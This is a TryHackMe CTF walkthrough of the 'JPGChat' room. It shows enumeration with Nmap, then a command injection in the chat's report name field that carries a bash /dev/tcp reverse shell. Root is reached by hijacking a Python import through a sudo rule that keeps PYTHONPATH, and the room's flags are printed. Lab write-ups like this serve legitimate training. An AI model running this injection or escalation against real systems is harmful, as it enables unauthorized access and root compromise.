## JPGChat - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/jpgchat)

<i>Hack into the machine and retrieve the flag</i>

**IP: 10.10.50.195**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Python <br>

**Tools Used**: Nmap<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- For this one you just need Nmap scan.

  ```
  nmap -sC -sV -T5 -p- 10.10.50.195

  PORT      STATE    SERVICE VERSION
  22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
  |   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
  |_  256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
  3000/tcp  open     ppp?
  | fingerprint-strings: 
  |   GenericLines, NULL: 
  |     Welcome to JPChat
  |     source code of this service can be found at our admin's github
  |     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
  |_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
  10511/tcp filtered unknown
  15998/tcp filtered 2ping
  21765/tcp filtered unknown
  28895/tcp filtered unknown
  37926/tcp filtered unknown
  38138/tcp filtered unknown
  41635/tcp filtered unknown
  41946/tcp filtered unknown
  47383/tcp filtered unknown
  50536/tcp filtered unknown
  52632/tcp filtered unknown
  53166/tcp filtered unknown
  61714/tcp filtered unknown
  63316/tcp filtered unknown
  64996/tcp filtered unknown
  ```
  
- When you connect with netcat on port 3000 you will have a prompt for message and report, whole script can be found on [admin page](https://github.com/Mozzie-jpg/JPChat)

  ```
  nc 10.10.50.195 3000
  Welcome to JPChat
  the source code of this service can be found at our admin's github
  MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
  REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
  [MESSAGE]
  There are currently 0 other users logged in
  [MESSAGE]: hello
  [MESSAGE]: print(flag.txt)
  
  nc 10.10.50.195 3000
  Welcome to JPChat
  the source code of this service can be found at our admin's github
  MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
  REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
  [REPORT]
  this report will be read by Mozzie-jpg
  your name:
  bimbo
  your report:
  you suck
  ```
  
- When you take a look on script you will see that [MESSAGE] will do absolutely nothing, but [REPORT] one will actually save the output with your name as well. So let's input reverse shell then.

---

## ⚙️ Shell Access

- For this one, you can use any bash reverse shell, I always use one-liner `bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1;`, start a listener and let's try it.

  ```
  nc 10.10.50.195 3000
  Welcome to JPChat
  the source code of this service can be found at our admin's github
  MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
  REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
  [REPORT]
  this report will be read by Mozzie-jpg
  your name:
  bimbo;bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1;
  your report:
  hola
  bimbo

  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.50.195] 39936
  bash: cannot set terminal process group (1377): Inappropriate ioctl for device
  bash: no job control in this shell
  wes@ubuntu-xenial:/$ whoami
  whoami
  wes
  wes@ubuntu-xenial:/$ id
  id
  uid=1001(wes) gid=1001(wes) groups=1001(wes)
  ```
  
- Perfect, we are in, change it to putty shell and let's get those flags.

---

## 🧍 User Privilege Escalation

- User flag is pretty straightforward.

  ```
  wes@ubuntu-xenial:/home$ cd wes/
  wes@ubuntu-xenial:~$ ls -al
  total 28
  drwxr-xr-x 2 wes  wes  4096 Jan 15  2021 .
  drwxr-xr-x 3 root root 4096 Jan 15  2021 ..
  -rw------- 1 wes  wes    85 May 18 14:59 .bash_history
  -rw-r--r-- 1 wes  wes   220 Aug 31  2015 .bash_logout
  -rw-r--r-- 1 wes  wes  3771 Aug 31  2015 .bashrc
  -rw-r--r-- 1 wes  wes   655 Jul 12  2019 .profile
  -rw-r--r-- 1 root root   38 Jan 15  2021 user.txt
  
  wes@ubuntu-xenial:~$ cat user.txt 
  JPC{487030410a543503cbb59ece16178318}
  ```
  
- Moving to escalation now.

---

## 👑 Root Privilege Escalation

- After running `sudo -l` you'll see that user `wes` can run a `test_module.py` script so I checked it out.

  ```
  wes@ubuntu-xenial:~$ sudo -l
  Matching Defaults entries for wes on ubuntu-xenial:
      mail_badpass, env_keep+=PYTHONPATH
  
  User wes may run the following commands on ubuntu-xenial:
      (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
  
  wes@ubuntu-xenial:~$ cd /opt/development/
  wes@ubuntu-xenial:/opt/development$ cat test_module.py 
  #!/usr/bin/env python3
  
  from compare import *
  
  print(compare.Str('hello', 'hello', 'hello'))
  
  find / -type f 2>/dev/null | grep compare.py
  /usr/lib/python3.5/compare.py
  /usr/lib/python2.7/dist-packages/lxml/doctestcompare.pyc
  /usr/lib/python2.7/dist-packages/lxml/doctestcompare.py
  ```
  
- OK, so this script basically just compares strings. We can get to root by manipulating Python's `compare` library. First enumerate writable directories and go to one that allows us most access `/dev/shm`.

  ```
  find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
  dev/char
  dev/fd
  dev/full
  dev/fuse
  dev/log
  dev/mqueue
  dev/net
  dev/null
  dev/ptmx
  dev/pts
  dev/random
  dev/shm
  dev/stderr
  dev/stdin
  dev/stdout
  dev/tty
  dev/urandom
  dev/zero
  home/wes
  lib/systemd
  opt/jpchat
  run/acpid.socket
  run/cloud-init
  run/dbus
  run/lock
  run/shm
  run/snapd-snap.socket
  run/snapd.socket
  run/systemd
  run/uuidd
  sys/fs
  sys/kernel
  tmp
  tmp/.font-unix
  tmp/.ICE-unix
  tmp/.Test-unix
  tmp/.X11-unix
  tmp/.XIM-unix
  var/crash
  var/lib
  var/lock
  var/tmp
  
  wes@ubuntu-xenial:/opt/development$ cd /dev/shm
  wes@ubuntu-xenial:/dev/shm$ ls -al
  total 0
  drwxrwxrwt  2 root root   40 May 18 14:44 .
  drwxr-xr-x 16 root root 3560 May 18 14:44 ..
  ```
  
- Now we create a new `compare.py` script that will execute `/bin/bash -p` and run it with PATH `PYTHONPATH=/dev/shm/` since it's required for sudo privileges. After that just read the flag.

  ```
  wes@ubuntu-xenial:/dev/shm$ nano compare.py
  wes@ubuntu-xenial:/dev/shm$ ls -al
  total 4
  drwxrwxrwt  2 root root   60 May 18 15:08 .
  drwxr-xr-x 16 root root 3560 May 18 14:44 ..
  -rw-r--r--  1 wes  wes   376 May 18 15:08 compare.py

  wes@ubuntu-xenial:/dev/shm$ sudo PYTHONPATH=/dev/shm/ /usr/bin/python3 /opt/development/test_module.py 
  root@ubuntu-xenial:/dev/shm# whoami
  root
  root@ubuntu-xenial:/dev/shm# id
  uid=0(root) gid=0(root) groups=0(root)
  root@ubuntu-xenial:/dev/shm# cat /root/root.txt
  JPC{665b7f2e59cf44763e5a7f070b081b0a}
  
  Also huge shoutout to Westar for the OSINT idea
  i wouldn't have used it if it wasnt for him.
  and also thank you to Wes and Optional for all the help while developing

  You can find some of their work here:
  https://github.com/WesVleuten
  https://github.com/optionalCTF
  ```

- That's all folks, love me some Python! You can find compare script [here](https://github.com/mauzware/Random-Scripts/blob/main/pwn-other/compare.py).

---

## 🏁 Flags

- **User Flag**: `JPC{487030410a543503cbb59ece16178318}`
- **Root Flag**: `JPC{665b7f2e59cf44763e5a7f070b081b0a}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding my way to root.`

- What did I learn?
  `New way of getting reverse shell.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
